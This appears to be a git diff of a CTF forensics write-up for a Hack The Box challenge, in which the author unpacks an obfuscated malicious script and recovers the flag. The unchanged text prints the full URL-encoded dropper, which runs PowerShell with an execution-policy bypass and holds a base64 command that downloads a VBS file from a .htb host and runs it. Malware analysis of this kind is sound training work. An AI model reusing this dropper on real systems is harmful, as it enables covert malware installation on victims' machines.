@@ -6,7 +6,7 @@
 
 After downling the file and open it, we can see that it is an URL encoded file :
 
-![image](
+![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/3.png)
 
 We can try to decode the file by doing some simple substitution : 
   - %2525 --> %25
@@ -14,17 +14,18 @@ We can try to decode the file by doing some simple substitution :
   - %20 --> (space)
   - (space) --> nothing
 
-we obtain : 
-
+we obtain :
 ```
 <scriptlanguage=JavaScript>m='%3Cscriptlanguage%3DJavaScript%3Em%3D%27%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3Cscriptlanguage%3DJavaScript%3Em%3D%27%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3C%21DOCTYPEhtml%3E%0A%3Cmetahttp-equiv%3D%22X-UA-Compatible%22content%3D%22IE%3DEmulateIE8%22%3E%0A%3Chtml%3E%0A%3Cbody%3E%0A%3CsCrIPTlANgUAge%3D%22VbScRipT%22%3E%0ADiM252520OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF%2CPoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM%3AsetOCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF%3DcreateoBjEct%28Chr%28%26H57%29%26%22SCRIPT.shELL%22%29%3APoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM%3D%22PowErShEll-ExBYPaSS-NOP-W1-CdEVIcEcrEDEnTIAlDePlOYmENt.EXe%3Biex%28%24%28iEX%28%27%5BSYsTeM.TeXt.EnCoding%5D%27+%5BchAr%5D0X3A+%5BCHAr%5D0X3A+%27uTf8.geTSTring%28%5BSYstem.ConVERT%5D%27+%5BchAR%5D58+%5BCHAR%5D58+%27fRoMBASE64string%28%27+%5BCHar%5D0X22+%27JGVhNmM4bXJUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1UeXBlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW1lTUJlckRlZmluSVRJb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnW0RsbEltcG9ydCgidVJMbU9OLmRsTCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFVSTERvd25sb2FkVG9GaWxlKEludFB0ciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBHLHN0cmluZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENmbXIsc3RyaW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVV2eVZCUkQsdWludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZmWWxEb2wsSW50UHRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb0ZYckloKTsnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW5BTUUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU3V4dFBJQkp4bCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtTmFtRXNQQWNFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbklZcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1QYXNzVGhydTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZWE2YzhtclQ6OlVSTERvd25sb2FkVG9GaWxlKDAsImh0dHA6Ly93YW50ZWQuYWxpdmUuaHRiLzM1L3dhbnRlZC50SUYiLCIkZU52OkFQUERBVEFcd2FudGVkLnZicyIsMCwwKTtTVEFSdC1zbGVlUCgzKTtzdEFSdCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkZW5WOkFQUERBVEFcd2FudGVkLnZicyI=%27+%5BcHar%5D0X22+%27%29%29%27%29%29%29%22%3AOCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.rUNchR%2834%29%26OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.eXpanDEnVIroNMENtSTRinGs%28Chr%28%26H25%29%26ChrW%28%26H53%29%26Chr%28%26H79%29%26ChrW%28%26H73%29%26ChrW%28%26H54%29%26ChrW%28%26H65%29%26ChrW%28%26H6D%29%26Chr%28%26H52%29%26ChrW%28%26H4F%29%26Chr%28%26H6F%29%26ChrW%28%26H74%29%26ChrW%28%26H25%29%29%26%22%5CSYStEM32%5CWINdOwSpoweRSheLL%5CV1.0%5CPoWERshElL.ExE%22%26chr%2834%29%26cHR%2832%29%26Chr%2834%29%26PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM%26CHr%2834%29%2C0%3ASETOCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF%3DNOThING%0ASeLF.CloSE%0A%3C/script%3E%0A%0A%3C/body%3E%0A%3C/html%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E%27%3Bd%3Dunescape%28m%29%3Bdocument.write%28d%29%3B%3C/script%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E%27%3Bd%3Dunescape%28m%29%3Bdocument.write%28d%29%3B%3C/script%3E';d=unescape(m);document.write(d);</script>
 ```
 
 We can then see that it uses a base64 encoding as written here : 
 
+![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/4.png)
 
 We copy the adequate code into cyberchef to decode it :
 
+![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/5.png)
 
 In the decoded code, we can observe a .htb with a subdomain that we give to the docker and it download another file called : wanted.tiF (24ca7385df40934a241d8c6859a00d0b8288294a8d7e953ba3fdea7fa3e01631)
 
@@ -196,7 +197,11 @@ End If
 ```
 We can read a kind of powershell command in the arran variable and there is another base64 encoding and after analyzing we see that the variable is latifoliado and by giving it again to cyberchef, we can decode to :
 
+![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/6.png)
+
 
 This give us another .htb with a sub-domain and by accessing the website, we obtain the flag :
+
+![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/7.png)
 
 flag : HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_5720876b4529e04e685e94557c88b049}
